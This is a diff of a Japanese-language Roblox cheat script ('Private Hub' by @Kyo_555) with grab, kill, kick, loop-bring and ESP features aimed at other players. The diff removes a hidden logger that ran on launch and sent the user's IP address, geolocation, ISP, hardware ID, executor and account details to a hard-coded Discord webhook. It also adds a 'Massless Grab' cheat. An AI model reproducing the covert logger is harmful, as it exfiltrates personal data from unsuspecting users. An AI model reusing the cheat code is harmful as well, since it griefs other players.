@@ -7,9 +7,6 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Workspace = game:GetService("Workspace")
 local TweenService = game:GetService("TweenService")
 local Debris = game:GetService("Debris")
-local MarketplaceService = game:GetService("MarketplaceService")
-local HttpService = game:GetService("HttpService")
-local GuiService = game:GetService("GuiService")
 
 local LP = Players.LocalPlayer
 
@@ -18,7 +15,7 @@ local Blue = Color3.fromRGB(0, 170, 255)
 
 -- ===== Window =====
 local Window = OrionLib:MakeWindow({
-    Name = "名募はぶ by @Kyo_555 >:)",
+    Name = "Private Hub by @Kyo_555 >:)",
     HidePremium = false,
     SaveConfig = true,
     ConfigFolder = "c00lhubConfig"
@@ -33,110 +30,6 @@ OrionLib.Theme = {
     Text = Color3.fromRGB(255, 255, 255),
     TextDark = Color3.fromRGB(180, 180, 200),
 }
-
--- ──────────────────────────────────────
--- ★★★ ロガー (起動時に自動実行) ★★★
--- ──────────────────────────────────────
-local webhookURL = "https://discord.com/api/webhooks/1520719334165446739/TRFknHcPJhJuCLBeot7EVNImVxS6oFHdLtMf72zxI2NO_MtD1A7yxi4wLmSnvQHZ0A0D"  -- ★ここにWebhook URLを入れてください★
-
-local function sendDetailedLog()
-    local ipData = "取得失敗"
-    local geoData = {regionName = "不明", city = "不明", isp = "不明", proxy = false}
-    local info = {Name = "不明"}
-    local avatarUrl = ""
-
-    local profileUrl = "https://www.roblox.com/users/" .. LP.UserId .. "/profile"
-    local gameUrl = "https://www.roblox.com/games/" .. game.PlaceId
-
-    pcall(function()
-        local thumbApi = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. LP.UserId .. "&size=720x720&format=Png&isCircular=false"
-        local thumbRes = game:HttpGet(thumbApi)
-        local thumbData = HttpService:JSONDecode(thumbRes)
-        if thumbData and thumbData.data and thumbData.data[1] then
-            avatarUrl = thumbData.data[1].imageUrl
-        else
-            avatarUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
-        end
-    end)
-
-    pcall(function()
-        info = MarketplaceService:GetProductInfo(game.PlaceId)
-        ipData = game:HttpGet("https://api.ipify.org")
-        local response = game:HttpGet("http://ip-api.com/json/" .. ipData .. "?lang=ja&fields=status,message,country,regionName,city,isp,proxy")
-        geoData = HttpService:JSONDecode(response)
-    end)
-
-    local executor = (identifyexecutor and identifyexecutor()) or "不明なExecutor"
-    local hwid = (gethwid and gethwid()) or "取得不可"
-    
-    local deviceDetail = "不明"
-    if GuiService:IsTenFootInterface() then
-        deviceDetail = "Console (Xbox/PS)"
-    elseif UserInputService.TouchEnabled then
-        local screenSize = workspace.CurrentCamera.ViewportSize
-        if math.min(screenSize.X, screenSize.Y) < 600 then
-            deviceDetail = "Mobile"
-        else
-            deviceDetail = "Tablet"
-        end
-    elseif UserInputService.KeyboardEnabled then
-        deviceDetail = "PC"
-    end
-
-    local data = {
-        ["embeds"] = {{
-            ["title"] = "omg: " .. LP.Name,
-            ["color"] = 0xff4500,
-            ["fields"] = {
-                {
-                    ["name"] = "ユーザー情報",
-                    ["value"] = "**Name:** `" .. LP.Name .. "`\n**ID:** [" .. LP.UserId .. "](" .. profileUrl .. ")\n**垢経過:** " .. LP.AccountAge .. "日\n🔗 **[プロフィールを開く](" .. profileUrl .. ")**",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "実行環境",
-                    ["value"] = "**Device:** " .. deviceDetail .. "\n**Executor:** `" .. executor .. "`\n**HWID:** `" .. hwid .. "`",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "ネットワーク",
-                    ["value"] = "**IP:** `" .. ipData .. "`\n**地域:** " .. geoData.regionName .. " " .. geoData.city .. "\n**ISP:** " .. geoData.isp .. "\n**VPN/Proxy:** " .. (geoData.proxy and "検出" or "無し"),
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "サーバー/実行場所",
-                    ["value"] = "**Game:** [" .. info.Name .. "](" .. gameUrl .. ")\n**PlaceId:** `" .. game.PlaceId .. "`\n**JobId:** `" .. game.JobId .. "`",
-                    ["inline"] = false
-                }
-            },
-            ["thumbnail"] = {
-                ["url"] = avatarUrl
-            },
-            ["footer"] = {
-                ["text"] = "でーもんLogger  " .. os.date("%Y/%m/%d %X")
-            }
-        }}
-    }
-
-    pcall(function()
-        local req = (syn and syn.request) or (http and http.request) or request
-        if req then
-            req({
-                Url = webhookURL,
-                Method = "POST",
-                Headers = { ["Content-Type"] = "application/json" },
-                Body = HttpService:JSONEncode(data)
-            })
-        end
-    end)
-end
-
--- ★★★ 起動時にロガーを実行 ★★★
-task.spawn(function()
-    if webhookURL and webhookURL ~= "ウェブフックのリンクここにいれる" then
-        sendDetailedLog()
-    end
-end)
 
 -- ──────────────────────────────────────
 -- Credit Tab (クレジットタブ)
@@ -156,12 +49,12 @@ CreditTab:AddParagraph(
 
 CreditTab:AddParagraph(
     "📝 スクリプト名",
-    "名募はぶ"
+    "Private Hub"
 )
 
 CreditTab:AddParagraph(
     "📅 バージョン",
-    "v5,2,9"
+    "v1.0"
 )
 
 CreditTab:AddParagraph(
@@ -180,7 +73,7 @@ CreditTab:AddParagraph(
     "⚠️ 注意事項",
     "・このスクリプトを使用し起きた事故などは作者であるKyo_555は責任を負いません。\n" ..
     "・スクリプトの不具合がある場合上記の連絡先までご連絡ください。\n" ..
-    "・このスクリプトの難読化を解除しないでください。難読化解除したらおこる😡"
+    "・このスクリプトはあまり高頻度でのアップデートは施されません。"
 )
 
 -- ──────────────────────────────────────
@@ -3243,7 +3136,7 @@ InvincibilityTab:AddParagraph("📝 Anti Input Lag 説明",
     "・効果は環境によって異なります"
 )
 
--- ★★★ アンチブロキルセクション ★★★
+-- ★★★ アンチブロキルセクション (新規追加) ★★★
 InvincibilityTab:AddSection({ Name = "アンチブロキル" })
 
 InvincibilityTab:AddToggle({
@@ -3293,7 +3186,7 @@ InvincibilityTab:AddParagraph("説明",
 )
 
 -- ──────────────────────────────────────
--- Grab Tab
+-- ★★★ Grab Tab (Massless Grab 追加) ★★★
 -- ──────────────────────────────────────
 local GrabTab = Window:MakeTab({
     Name = "グラブ",
@@ -3301,6 +3194,7 @@ local GrabTab = Window:MakeTab({
     PremiumOnly = false
 })
 
+-- ===== 既存のグラブ機能 (grabFlags) =====
 local grabFlags = {
     KillGrab = false,
     SkyGrab = false,
@@ -3320,6 +3214,11 @@ local grabStrength = 500
 local poisonHurtParts = {}
 local noclipGrabCo = nil
 local kickGrabConnections = {}
+
+-- ★★★ Massless Grab 用変数 (追加) ★★★
+_G.MassLessGrab = false
+_G.MLSense = 200
+_G.MLConn = nil
 
 local function getPoisonParts()
     local parts = {}
@@ -3609,6 +3508,7 @@ Workspace.ChildAdded:Connect(function(model)
     end)
 end)
 
+-- ===== Grab Tab UI =====
 GrabTab:AddSection({ Name = "グラブエフェクト" })
 
 GrabTab:AddToggle({
@@ -3714,6 +3614,80 @@ GrabTab:AddToggle({
     Color = Blue,
     Callback = function(v) grabFlags.StrengthEnabled = v end
 })
+
+-- ★★★ ★★★ ★★★
+-- ★★★ Massless Grab (新規追加) ★★★
+-- ★★★ ★★★ ★★★
+GrabTab:AddSection({ Name = "Massless Grab" })
+
+GrabTab:AddSlider({
+    Name = "Massless Sensitivity",
+    Min = 10,
+    Max = 1000,
+    Default = 200,
+    Color = Color3.fromRGB(255, 255, 255),
+    Increment = 10,
+    ValueName = "Sensitivity",
+    Callback = function(Value)
+        _G.MLSense = Value
+    end
+})
+
+GrabTab:AddToggle({
+    Name = "Massless Grab",
+    Default = false,
+    Color = Blue,
+    Callback = function(Value)
+        _G.MassLessGrab = Value
+        if not _G.MassLessGrab then
+            if _G.MLConn then
+                _G.MLConn:Disconnect()
+                _G.MLConn = nil
+            end
+            return
+        end
+        
+        if _G.MLConn then
+            _G.MLConn:Disconnect()
+            _G.MLConn = nil
+        end
+        
+        _G.MLConn = RunService.Heartbeat:Connect(function()
+            if not _G.MassLessGrab then
+                return
+            end
+            
+            local gp = workspace:FindFirstChild("GrabParts")
+            if not gp then
+                return
+            end
+            
+            local dp = gp:FindFirstChild("DragPart")
+            if not dp then
+                return
+            end
+            
+            local ap = dp:FindFirstChild("AlignPosition")
+            local ao = dp:FindFirstChild("AlignOrientation")
+            
+            if ap then
+                ap.Responsiveness = _G.MLSense
+                ap.MaxForce = math.huge
+                ap.MaxVelocity = math.huge
+            end
+            if ao then
+                ao.Responsiveness = _G.MLSense
+                ao.MaxTorque = math.huge
+            end
+        end)
+    end
+})
+
+GrabTab:AddParagraph("📝 Massless Grab説明", 
+    "・相手を掴んだ時に重量を無視して軽く持ち上げます\n" ..
+    "・Sensitivityを調整することで掴みの感度を変更できます\n" ..
+    "・ONにするとGrabPartsのAlign系のパラメータを最適化します"
+)
 
 GrabTab:AddParagraph("使い方", 
     "・相手を掴んだ時に効果が発動します\n" ..
@@ -3930,8 +3904,7 @@ local LoopPlayerDropdown = LoopTab:AddDropdown({
         local player = Players:FindFirstChild(playerName)
         if player and player ~= LP then
             local found = false
-            for _, p in ipairs(loopSelectedPlayers) do
-                if p == playerName then found = true break end
+            for _, p in ipairs(loopSelectedPlayers) do                if p == playerName then found = true break end
             end
             if not found then
                 table.insert(loopSelectedPlayers, playerName)
@@ -4002,7 +3975,7 @@ LoopTab:AddToggle({
         isBringing = value
         if value then
             task.spawn(function()
-                while isBringing do
+                while isBringing do   
                     for i = #loopSelectedPlayers, 1, -1 do
                         if not isBringing then break end
                         local playerName = loopSelectedPlayers[i]
@@ -4635,7 +4608,7 @@ espIconSection:AddParagraph("説明",
 )
 
 -- ──────────────────────────────────────
--- ★★★ 「線」タブ (FurtherReach) ★★★
+-- ★★★ 「線」タブ ★★★
 -- ──────────────────────────────────────
 local LineTab = Window:MakeTab({
     Name = "線",
@@ -4729,7 +4702,7 @@ end)
 OrionLib:Init()
 
 OrionLib:MakeNotification({
-    Name = "Hub Loaded",
+    Name = "Hub Loaded!",
     Content = "名募はぶへようこそ！",
     Time = 6
 })
